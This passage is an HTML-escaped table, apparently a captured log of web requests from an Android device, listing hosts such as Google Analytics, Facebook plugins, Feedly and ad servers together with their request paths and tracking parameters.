                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            127
                          &lt;/th&gt;

                          &lt;td&gt;
                            tags.w55c.net
                          &lt;/td&gt;

                          &lt;td&gt;
                            /match-result?id=8bb138bc0446417c9a4df9a0136d0caf8a93328592bf4d059bfc856c256fbc33&amp;ei=GOOGLE&amp;euid=&amp;google_gid=CAESEB5v8HfUGT2_1i1y9vNdT4c&amp;google_cver=1
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            128
                          &lt;/th&gt;

                          &lt;td&gt;
                            tags.w55c.net
                          &lt;/td&gt;

                          &lt;td&gt;
                            /match-result?id=8bb138bc0446417c9a4df9a0136d0caf8a93328592bf4d059bfc856c256fbc33&amp;ei=GOOGLE&amp;euid=&amp;google_gid=CAESECkZd52UzYAgxK8IiL5RJDk&amp;google_cver=1
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            129
                          &lt;/th&gt;

                          &lt;td&gt;
                            tags.w55c.net
                          &lt;/td&gt;

                          &lt;td&gt;
                            /rs?id=27f879b4032245c49b707e45f0c1a11b&amp;t=checkout&amp;tx=TRANSACTION_ID&amp;sku=SKUS&amp;price=$price
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            130
                          &lt;/th&gt;

                          &lt;td&gt;
                            tags.w55c.net
                          &lt;/td&gt;

                          &lt;td&gt;
                            /rs?id=9092f72a92594747b09a1f9d78921f2d&amp;t=homepage
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            131
                          &lt;/th&gt;

                          &lt;td&gt;
                            tap.rubiconproject.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /oz/feeds/amazon-rtb/tokens/?rt=img
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            132
                          &lt;/th&gt;

                          &lt;td&gt;
                            taz.met.vgwort.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /na/1239043821a44d96a088d86545a3ff51
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            133
                          &lt;/th&gt;

                          &lt;td&gt;
                            themes.googleusercontent.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /5GKRInj6vlWTBQ3qIHmAY92S3AaO4PlSJFBLsQ2lUMHp-XwkAwcBjXWzgRfbuUdoGQ7MDjFfnitQ_LEo7vN58KNMcrI=s143
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            134
                          &lt;/th&gt;

                          &lt;td&gt;
                            themes.googleusercontent.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /XTjCnWNjnmjszjQJR2qqOcmHQ1Irp0L1rI3cMnDMhvjSI8Bxu5DZL7jFOKRAaPg8J20J7rWwtHWk64UyZDrd_MQZkXM=s694-c
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            135
                          &lt;/th&gt;

                          &lt;td&gt;
                            themes.googleusercontent.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /s2/favicons?domain=casadefazdeconta.com&amp;alt=feed
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            136
                          &lt;/th&gt;

                          &lt;td&gt;
                            themes.googleusercontent.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /s2/favicons?domain=dinheirovivo.pt&amp;alt=feed
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            137
                          &lt;/th&gt;

                          &lt;td&gt;
                            themes.googleusercontent.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /s2/favicons?domain=tumblr.com&amp;alt=feed
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            138
                          &lt;/th&gt;

                          &lt;td&gt;
                            themes.googleusercontent.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /s2/favicons?domain=www.mdr.de&amp;alt=feed
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            139
                          &lt;/th&gt;

                          &lt;td&gt;
                            themes.googleusercontent.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /s2/favicons?domain=www.ndr.de&amp;alt=feed
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            140
                          &lt;/th&gt;

                          &lt;td&gt;
                            themes.googleusercontent.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /s2/favicons?domain=www1.sportschau.de&amp;alt=feed
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            141
                          &lt;/th&gt;

                          &lt;td&gt;
                            themes.googleusercontent.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /s2/favicons?domain=www1.wdr.de&amp;alt=feed
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            142
                          &lt;/th&gt;

                          &lt;td&gt;
                            themes.googleusercontent.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /static/fonts/opensans/v7/MTP_ySUJH_bn48VBG8sNSndckgy16U_L-eNUgMz0EAk.ttf
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            143
                          &lt;/th&gt;

                          &lt;td&gt;
                            themes.googleusercontent.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /static/fonts/opensans/v7/RjgO7rYTmqiVp7vzi-Q5USZ2oysoEQEeKwjgmXLRnTc.ttf
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            144
                          &lt;/th&gt;

                          &lt;td&gt;
                            themes.googleusercontent.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /static/fonts/roboto/v10/Hgo13k-tfSpn0qi1SFdUfSZ2oysoEQEeKwjgmXLRnTc.ttf
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            145
                          &lt;/th&gt;

                          &lt;td&gt;
                            tvthek.orf.at
                          &lt;/td&gt;

                          &lt;td&gt;
                            /dynamic/get_asset.php?a=orf_programs%2Flogo%2F1915503.jpg&amp;h=98169862358ff9a5497768a7b86aca9df89aa99a
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            146
                          &lt;/th&gt;

                          &lt;td&gt;
                            weather.yahooapis.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /forecastrss?w=2345496&amp;u=c
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            147
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.androidpit.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /apps/app2-teaser-popup?xl=true&amp;ooc=true
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            148
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.androidpit.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /de/android/forum/thread/573726/slimbean-Build-4-3
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            149
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.androidpit.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /favicon.ico?v=3
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            150
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.androidpit.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /nagScreen/popup
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            151
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.burstnet.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /user/3/?redirect=http%3A%2F%2Fs.amazon-adsystem.com%2Fecm3%3Fid%3D%24UID%26ex%3Dadconductor.com
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            152
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.facebook.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /fr/u.php?p=221790734642435&amp;m=3ltDx98WRvqCEwbUdtkJbQ&amp;r=us
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            153
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.facebook.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /plugins/like.php?action=recommend&amp;api_key=268419256515542&amp;channel_url=http%3A%2F%2Fstatic.ak.facebook.com%2Fconnect%2Fxd_arbiter.php%3Fversion%3D28%23cb%3Df1786c6af4%26domain%3Dwww.sueddeutsche.de%26origin%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Ff633042fc%26relation%3Dparent.parent&amp;colorscheme=light&amp;extended_social_context=false&amp;font=arial&amp;href=http%3A%2F%2Fwww.sueddeutsche.de%2Fmuenchen%2Fmuenchen-haidhausen-ploetzlich-zehn-meter-tiefes-loch-im-gehweg-1.1866074&amp;layout=box_count&amp;locale=de_DE&amp;node_type=link&amp;sdk=joey&amp;send=false&amp;show_faces=false&amp;width=115
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            154
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.facebook.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /plugins/like.php?action=recommend&amp;api_key=268419256515542&amp;channel_url=http%3A%2F%2Fstatic.ak.facebook.com%2Fconnect%2Fxd_arbiter.php%3Fversion%3D28%23cb%3Df2ed5bc97%26domain%3Dwww.sueddeutsche.de%26origin%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Ff194ee9f04%26relation%3Dparent.parent&amp;colorscheme=light&amp;extended_social_context=false&amp;font=arial&amp;href=http%3A%2F%2Fwww.sueddeutsche.de%2Fkarriere%2Fstudie-hunderttausende-akademiker-arbeiten-fuer-niedrigloehne-1.1866212&amp;layout=box_count&amp;locale=de_DE&amp;node_type=link&amp;sdk=joey&amp;send=false&amp;show_faces=false&amp;width=115
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            155
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.facebook.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /plugins/like.php?action=recommend&amp;api_key=268419256515542&amp;channel_url=http%3A%2F%2Fstatic.ak.facebook.com%2Fconnect%2Fxd_arbiter.php%3Fversion%3D28%23cb%3Dfe08343b8%26domain%3Dwww.sueddeutsche.de%26origin%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Ff33f5d0024%26relation%3Dparent.parent&amp;colorscheme=light&amp;extended_social_context=false&amp;font=arial&amp;href=http%3A%2F%2Fwww.sueddeutsche.de%2Fdigital%2Fstreamseite-redtube-loechriges-gutachten-bringt-porno-abmahner-in-bedraengnis-1.1866025&amp;layout=box_count&amp;locale=de_DE&amp;node_type=link&amp;sdk=joey&amp;send=false&amp;show_faces=false&amp;width=115
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            156
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.feedly.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /config-overlay.v5.json?ck=1390050786306
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            157
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.feedly.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /v3/markers/counts?ck=1390050791248&amp;ct=feedly.mobile.android.1&amp;cv=18.0.4
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            158
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.feedly.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /v3/mixes/contents?streamId=user%2F66d95ad3-e977-4150-b00a-8c5d808ecdda%2Fcategory%2FBlogs&amp;count=6&amp;ck=1390050791276&amp;backfill=true&amp;boostMustRead=true&amp;hours=14&amp;ct=feedly.mobile.android.1&amp;cv=18.0.4&amp;unreadOnly=true
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            159
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.feedly.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /v3/mixes/contents?streamId=user%2F66d95ad3-e977-4150-b00a-8c5d808ecdda%2Fcategory%2FDeutschland&amp;count=6&amp;ck=1390050792054&amp;backfill=true&amp;boostMustRead=true&amp;hours=14&amp;ct=feedly.mobile.android.1&amp;cv=18.0.4&amp;unreadOnly=true
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            160
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.feedly.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /v3/preferences?ck=1390050786725&amp;ct=feedly.mobile.android.1&amp;cv=18.0.4
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            161
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.feedly.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /v3/profile?ck=1390050786734&amp;ct=feedly.mobile.android.1&amp;cv=18.0.4
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            162
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.feedly.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /v3/subscriptions?ck=1390050786739&amp;ct=feedly.mobile.android.1&amp;cv=18.0.4
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            163
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.google-analytics.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /__utm.gif?utmwv=4.8.1ma&amp;utmn=319752051&amp;&lt;span style=&quot;background-color: #00ff00;&quot;&gt;utme=8(1!clientType*2!feedlyVersion*3!wave*4!logged*5!transition)9(1!android.1*2!18.0.4*3!2013.17*4!yes*5!stack)11(1!1*2!1*3!1*4!1*5!1)&amp;utmcs=UTF-&lt;/span&gt;8&amp;utmsr=800&amp;#215;1280&amp;utmul=de-DE&amp;utmp=%2Fmy&amp;utmac=UA-46940058-1&amp;utmcc=__utma%3D1.580923361.1368709109.1389969064.1390050791.142%3B&amp;utmhid=1408137172&amp;aip=1&amp;utmht=1390050791286&amp;utmqt=10062
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            164
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.google-analytics.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /__utm.gif?utmwv=5.4.6&amp;utms=1&amp;utmn=1693448053&amp;utmhn=&lt;span style=&quot;background-color: #00ff00;&quot;&gt;intelcrawler.com&lt;/span&gt;&amp;utmcs=UTF-8&amp;u&lt;span style=&quot;background-color: #00ff00;&quot;&gt;tmsr=800&amp;#215;1280&lt;/span&gt;&amp;utmvp=479&amp;#215;710&amp;utmsc=32-bit&amp;utmul=de-de&amp;utmje=0&amp;utmfl=-&amp;utmdt=IntelCrawler%20-%20Multi-tier%20Intelligence%20Aggregator%20-%20%22Decebal%22%20Point-of-Sale%20Malware%20-%20400%20lines%20of%20VBScript%20code%20from%20Romania%2C%20researchers%20warns%20about%20evolution%20of%20threats%20and%20interests%20to%20modern%20retailers&amp;utmhid=622979055&amp;utmr=http%3A%2F%2Fflipboard.com%2Fredirect%3Furl%3Dhttp%253A%252F%252Fintelcrawler.com%252Fabout%252Fpress07&amp;utmp=%2Fabout%2Fpress07&amp;utmht=1390051703933&amp;utmac=UA-12964573-5&amp;utmcc=__utma%3D238268888.570751254.1390051692.1390051704.1390051704.1%3B%2B__utmz%3D238268888.1390051704.1.1.utmcsr%3Dflipboard.com%7Cutmccn%3D(referral)%7Cutmcmd%3Dreferral%7Cutmcct%3D%2Fredirect%3B&amp;utmu=CAAgAAAAACAAAAAAAAAB~
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            165
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.google-analytics.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /__utm.gif?utmwv=5.4.6&amp;utms=1&amp;utmn=1835366899&amp;utmhn=www.androidpit.de&amp;utmt=var&amp;utmht=1390123642976&amp;utmac=UA-7489116-13&amp;utmcc=__utma%3D228547149.678182810.1388960726.1389614896.1390123639.3%3B%2B__utmz%3D228547149.1388960730.1.1.utmcsr%3D(direct)%7Cutmccn%3D(direct)%7Cutmcmd%3D(none)%3B%2B__utmv%3D228547149.st_teaser_bar_v3%2520%253D%25203%3B&amp;utmu=oQAQAAAAAAAAAAAAAAQ~
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            166
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.google-analytics.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /__utm.gif?utmwv=5.4.6&amp;utms=1&amp;utmn=541863565&amp;utmhn=m.faz.net&amp;utmcs=UTF-8&amp;utmsr=800&amp;#215;1280&amp;utmvp=479&amp;#215;710&amp;utmsc=32-bit&amp;utmul=de-de&amp;utmje=0&amp;utmfl=-&amp;utmdt=Nach%2048%20Tagen%3A%20Sechzehnj%C3%A4hriger%20erreicht%20S%C3%BCdpol%20auf%20Skiern%20-%20Menschen%20-%20FAZ&amp;utmhid=2126014730&amp;utmr=-&amp;utmp=%2Faktuell%2Fgesellschaft%2Fmenschen%2Fnach-48-tagen-sechzehnjaehriger-erreicht-suedpol-auf-skiern-12759067.html&amp;utmht=1390147721385&amp;utmac=UA-579018-29&amp;utmcc=__utma%3D176063486.1784137468.1390039726.1390051124.1390147721.4%3B%2B__utmz%3D176063486.1390039726.1.1.utmcsr%3D(direct)%7Cutmccn%3D(direct)%7Cutmcmd%3D(none)%3B&amp;utmu=q~
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            167
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.google-analytics.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /__utm.gif?utmwv=5.4.6&amp;utms=1&amp;utmn=929417289&amp;utmhn=m.faz.net&amp;utmcs=UTF-8&amp;utmsr=800&amp;#215;1280&amp;utmvp=479&amp;#215;710&amp;utmsc=32-bit&amp;utmul=de-de&amp;utmje=0&amp;utmfl=-&amp;utmdt=Sozialleistungen%3A%20Neuer%20Streit%20um%20Hartz%20IV%20f%C3%BCr%20Rum%C3%A4nen%20und%20Bulgaren%20-%20Wirtschaft%20-%20FAZ&amp;utmhid=1516003805&amp;utmr=-&amp;utmp=%2Faktuell%2Fwirtschaft%2Fsozialleistungen-neuer-streit-um-hartz-iv-fuer-rumaenen-und-bulgaren-12757096.html&amp;utmht=1390051124276&amp;utmac=UA-579018-29&amp;utmcc=__utma%3D176063486.1784137468.1390039726.1390044476.1390051124.3%3B%2B__utmz%3D176063486.1390039726.1.1.utmcsr%3D(direct)%7Cutmccn%3D(direct)%7Cutmcmd%3D(none)%3B&amp;utmu=q~
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            168
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.google-analytics.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /__utm.gif?utmwv=5.4.6&amp;utms=2&amp;utmn=1853522898&amp;utmhn=www.androidpit.de&amp;utme=8(st_teaser_bar_v3_%5Buser%5D*5!st_teaser_bar_v3_%5Bsession%5D*st_teaser_bar_v3_%5Bpage%5D)9(3*5!3*3)11(1*5!2)&amp;utmcs=UTF-8&amp;utmsr=800&amp;#215;1280&amp;utmvp=320&amp;#215;240&amp;utmsc=32-bit&amp;utmul=de-de&amp;utmje=0&amp;utmfl=-&amp;utmdt=slimbean%20Build%204.3%20%E2%80%94%20Android%20Forum%20-%20AndroidPIT&amp;utmhid=1042539821&amp;utmr=-&amp;utmp=%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3&amp;utmht=1390123643001&amp;utmac=UA-7489116-13&amp;utmcc=__utma%3D228547149.678182810.1388960726.1389614896.1390123639.3%3B%2B__utmz%3D228547149.1388960730.1.1.utmcsr%3D(direct)%7Cutmccn%3D(direct)%7Cutmcmd%3D(none)%3B%2B__utmv%3D228547149.st_teaser_bar_v3%2520%253D%25203%3B&amp;utmu=qQAQAAAAAAAAAAAAAAQ~
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            169
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.google-analytics.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /__utm.gif?utmwv=5.4.6&amp;utms=3&amp;utmn=2092754937&amp;utmhn=www.androidpit.de&amp;utmt=var&amp;utmht=1390123643057&amp;utmac=UA-7489116-1&amp;utmcc=__utma%3D228547149.678182810.1388960726.1389614896.1390123639.3%3B%2B__utmz%3D228547149.1388960730.1.1.utmcsr%3D(direct)%7Cutmccn%3D(direct)%7Cutmcmd%3D(none)%3B%2B__utmv%3D228547149.st_teaser_bar_v3%2520%253D%25203%3B&amp;utmmt=1&amp;utmu=qQAwAAAAAAAAAAAAAAQAAAB~
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            170
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.google-analytics.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /__utm.gif?utmwv=5.4.6&amp;utms=4&amp;utmn=937544652&amp;utmhn=www.androidpit.de&amp;utme=8(st_teaser_bar_v3_%5Buser%5D*5!st_teaser_bar_v3_%5Bsession%5D*st_teaser_bar_v3_%5Bpage%5D)9(3*5!3*3)11(1*5!2)&amp;utmcs=UTF-8&amp;utmsr=800&amp;#215;1280&amp;utmvp=320&amp;#215;240&amp;utmsc=32-bit&amp;utmul=de-de&amp;utmje=0&amp;utmfl=-&amp;utmdt=slimbean%20Build%204.3%20%E2%80%94%20Android%20Forum%20-%20AndroidPIT&amp;utmhid=1042539821&amp;utmr=-&amp;utmp=%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3&amp;utmht=1390123643073&amp;utmac=UA-7489116-1&amp;utmcc=__utma%3D228547149.678182810.1388960726.1389614896.1390123639.3%3B%2B__utmz%3D228547149.1388960730.1.1.utmcsr%3D(direct)%7Cutmccn%3D(direct)%7Cutmcmd%3D(none)%3B%2B__utmv%3D228547149.st_teaser_bar_v3%2520%253D%25203%3B&amp;utmmt=1&amp;utmu=qQAwAAAAAAAAAAAAAAQAAAB~
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            171
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.google-analytics.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /__utm.gif?utmwv=5.4.6&amp;utms=5&amp;utmn=519479110&amp;utmhn=www.androidpit.de&amp;utmt=var&amp;utmht=1390123643111&amp;utmac=UA-7489116-21&amp;utmcc=__utma%3D228547149.678182810.1388960726.1389614896.1390123639.3%3B%2B__utmz%3D228547149.1388960730.1.1.utmcsr%3D(direct)%7Cutmccn%3D(direct)%7Cutmcmd%3D(none)%3B%2B__utmv%3D228547149.st_teaser_bar_v3%2520%253D%25203%3B&amp;utmmt=1&amp;utmu=qQAwAAAAAAAAAAAAAAQAAAB~
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            172
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.google-analytics.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /__utm.gif?utmwv=5.4.6&amp;utms=6&amp;utmn=431677047&amp;utmhn=www.androidpit.de&amp;utme=8(st_teaser_bar_v3_%5Buser%5D*3!newsNavigationCount*5!st_teaser_bar_v3_%5Bsession%5D*st_teaser_bar_v3_%5Bpage%5D)9(3*3!0*5!3*3)11(1*5!2)&amp;utmcs=UTF-8&amp;utmsr=800&amp;#215;1280&amp;utmvp=320&amp;#215;240&amp;utmsc=32-bit&amp;utmul=de-de&amp;utmje=0&amp;utmfl=-&amp;utmdt=slimbean%20Build%204.3%20%E2%80%94%20Android%20Forum%20-%20AndroidPIT&amp;utmhid=1042539821&amp;utmr=-&amp;utmp=%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3&amp;utmht=1390123643127&amp;utmac=UA-7489116-21&amp;utmcc=__utma%3D228547149.678182810.1388960726.1389614896.1390123639.3%3B%2B__utmz%3D228547149.1388960730.1.1.utmcsr%3D(direct)%7Cutmccn%3D(direct)%7Cutmcmd%3D(none)%3B%2B__utmv%3D228547149.st_teaser_bar_v3%2520%253D%25203%3B&amp;utmmt=1&amp;utmu=qQAwAAAAAAAAAAAAAAQAAAB~
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            173
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.google-analytics.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /collect?v=1&amp;_v=j15&amp;a=622979055&amp;t=pageview&amp;_s=1&amp;dl=http%3A%2F%2Fintelcrawler.com%2Fabout%2Fpress07&amp;dr=http%3A%2F%2Fflipboard.com%2Fredirect%3Furl%3Dhttp%253A%252F%252Fintelcrawler.com%252Fabout%252Fpress07&amp;ul=de-de&amp;de=UTF-8&amp;dt=IntelCrawler%20-%20Multi-tier%20Intelligence%20Aggregator%20-%20%22Decebal%22%20Point-of-Sale%20Malware%20-%20400%20lines%20of%20VBScript%20code%20from%20Romania%2C%20researchers%20warns%20about%20evolution%20of%20threats%20and%20interests%20to%20modern%20retailers&amp;sd=32-bit&amp;sr=800&amp;#215;1280&amp;vp=479&amp;#215;710&amp;je=0&amp;_u=ME~&amp;cid=570751254.1390051692&amp;tid=UA-46122210-1&amp;z=910916350
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            174
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.google-analytics.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /collect?v=1&amp;_v=j15&amp;aip=1&amp;a=1403566109&amp;t=pageview&amp;_s=1&amp;dl=http%3A%2F%2Fwww.sueddeutsche.de%2Fkarriere%2Fstudie-hunderttausende-akademiker-arbeiten-fuer-niedrigloehne-1.1866212&amp;dr=http%3A%2F%2Fflipboard.com%2Fredirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fkarriere%252Fstudie-hunderttausende-akademiker-arbeiten-fuer-niedrigloehne-1.1866212&amp;ul=de-de&amp;de=UTF-8&amp;dt=Hunderttausende%20Akademiker%20arbeiten%20zu%20Niederl%C3%B6hnen%20-%20Karriere%20-%20S%C3%BCddeutsche.de&amp;sd=32-bit&amp;sr=800&amp;#215;1280&amp;vp=479&amp;#215;710&amp;je=0&amp;_utma=6611437.1403719128.1390050886.1390050886.1390147627.2&amp;_utmz=6611437.1390147627.2.2.utmcsr%3Dflipboard.com%7Cutmccn%3D(referral)%7Cutmcmd%3Dreferral%7Cutmcct%3D%2Fredirect&amp;_utmht=1390147630325&amp;_u=cACC~&amp;cid=1403719128.1390050886&amp;tid=UA-19474199-5&amp;cd1=200&amp;z=484400949
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            175
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.google-analytics.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /collect?v=1&amp;_v=j15&amp;aip=1&amp;a=2138069351&amp;t=pageview&amp;_s=1&amp;dl=http%3A%2F%2Fwww.sueddeutsche.de%2Fdigital%2Fstreamseite-redtube-loechriges-gutachten-bringt-porno-abmahner-in-bedraengnis-1.1866025&amp;dr=http%3A%2F%2Fflipboard.com%2Fredirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fdigital%252Fstreamseite-redtube-loechriges-gutachten-bringt-porno-abmahner-in-bedraengnis-1.1866025&amp;ul=de-de&amp;de=UTF-8&amp;dt=Redtube%3A%20Gutachten%20setzt%20Porno-Abmahner%20unter%20Druck%20-%20Digital%20-%20S%C3%BCddeutsche.de&amp;sd=32-bit&amp;sr=800&amp;#215;1280&amp;vp=479&amp;#215;710&amp;je=0&amp;_utma=6611437.1403719128.1390050886.1390050886.1390050886.1&amp;_utmz=6611437.1390050886.1.1.utmcsr%3Dflipboard.com%7Cutmccn%3D(referral)%7Cutmcmd%3Dreferral%7Cutmcct%3D%2Fredirect&amp;_utmht=1390051329333&amp;_u=cACC~&amp;cid=1403719128.1390050886&amp;tid=UA-19474199-5&amp;cd1=200&amp;z=283053957
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            176
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.google-analytics.com
                          &lt;/td&gt;

                          &lt;td&gt;
